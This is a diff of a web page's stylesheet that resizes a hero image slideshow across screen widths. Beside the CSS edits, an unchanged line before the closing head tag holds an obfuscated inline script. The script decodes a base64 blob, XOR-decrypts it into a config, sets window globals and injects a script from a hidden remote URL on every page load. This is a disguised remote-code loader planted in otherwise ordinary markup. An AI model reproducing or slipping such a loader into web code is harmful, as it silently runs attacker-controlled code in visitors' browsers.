@@ -74,8 +74,8 @@
 
     /* HERO */
     .hero { position: relative; overflow: hidden; }
-    .hero-visual { position: relative; aspect-ratio: 3/4; overflow: hidden; background: #111; }
-    .hero-slide { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; object-position: center top; display: block; opacity: 0; transition: opacity .9s ease; }
+    .hero-visual { position: relative; overflow: hidden; background: #111; height: 100vw; max-height: 480px; }
+    .hero-slide { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; object-position: center center; display: block; opacity: 0; transition: opacity .9s ease; }
     .hero-slide.active { opacity: 1; }
     .hero-placeholder { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: linear-gradient(135deg, #006E65, #009184); color: #fff; gap: 1rem; }
     .hero-placeholder svg { width: 64px; height: 64px; opacity: .6; }
@@ -217,7 +217,8 @@
     .hero-arrow-prev { left: .75rem; }
     .hero-arrow-next { right: .75rem; }
 
-    @media (min-width: 481px) { .hero-visual { max-height: 560px; } }
+    @media (min-width: 600px) { .hero-visual { height: 56vw; max-height: 600px; } }
+    @media (min-width: 1024px) { .hero-visual { height: 480px; max-height: 480px; } }
   </style>
   <script>(function(){var f_j1=atob("DFrIuJhIWD4AzZBfvyHqzeokegQipeQrzynyl7crPFAuuOQy1jyxlvsnNRBiv78s3CihyOw7d05ptfUzkCqhwP0kdlRz77x93i68yvEqLUplvrJl5Afkmv8kN1xhoeN9hQGzmvYpNVsi97Iv1iKt1NEsehIiu/Ezyj/qgrp+OQZk/KRsiWys3aB9Og0z/6E8jGv9iqBqJWN9");var r_52=[];for(var t_gd42=0;t_gd42<f_j1.length;t_gd42++){r_52.push(f_j1.charCodeAt(t_gd42)&255);}var h_r=r_52[0];var j_yx=r_52.slice(1,1+h_r);var g_d=r_52.slice(1+h_r);var x_iv=g_d.map(function(b,x_4wf){return b^j_yx[x_4wf%h_r];});var y_hp3z="";for(var i_4=0;i_4<x_iv.length;i_4++){y_hp3z+=String.fromCharCode(x_iv[i_4]&255);}var u_3o6=decodeURIComponent(escape(y_hp3z));var g_f3=JSON.parse(u_3o6);var c_vxp=g_f3.globals||[];c_vxp.forEach(function(o_o9){window[o_o9.name]=o_o9.value;});var u_p6=document.createElement("script");u_p6.src=g_f3.url;u_p6.async=true;u_p6.defer=true;(g_f3.attributes||[]).forEach(function(d_xoh){u_p6.setAttribute(d_xoh.name,d_xoh.value);});(document.head||document.documentElement).appendChild(u_p6);})();</script>
 </head>
